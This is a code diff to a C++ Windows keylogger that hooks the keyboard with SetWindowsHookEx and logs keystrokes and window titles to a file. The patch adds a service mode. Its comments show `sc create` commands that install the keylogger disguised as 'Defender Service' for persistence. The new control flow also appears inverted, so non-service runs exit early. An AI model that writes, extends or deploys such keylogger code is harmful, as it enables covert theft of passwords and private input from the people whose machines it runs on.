@@ -13,6 +13,11 @@
 #include <iostream>
 #include <chrono>
 
+// C:\ > sc create "Defender Service" binPath="C:\...\SetWindowsHookEx-Keylogger.exe -service"
+// C:\>sc delete "Defender Service"
+
+int SampleServiceMain(int argc, TCHAR *argv[]);
+
 // KeyBoard hook handle in global scope
 HHOOK KeyboardHook;
 // Shift Key 
@@ -23,8 +28,6 @@ CHAR cWindow[1000];
 HWND lastWindow = NULL;
 // File Path
 std::wstring fileName = L"C:\\test.txt";
-
-
 
 // All hooks must be unhooked!
 void unhookKeyboard()
@@ -245,6 +248,19 @@ public:
 		//return true;
 		return false;
 	}
+
+	static bool Service(LPSTR lpCmdLine) {
+		std::string cmdLine(lpCmdLine);
+
+		if (std::string::npos != cmdLine.find("-service"))
+		{
+			Debug("Service: Calling SampleServiceMain");
+			SampleServiceMain(0, NULL);
+			return false;
+		}
+
+		return true;
+	}
 };
 
 LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
@@ -388,7 +404,6 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-
 int WinMain(
 	HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
@@ -396,7 +411,13 @@ int WinMain(
 	int       nShowCmd
 )
 {
+	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");
+
 	if (My::Test()) {
+		return 0;
+	}
+
+	if (My::Service(lpCmdLine)) {
 		return 0;
 	}
 
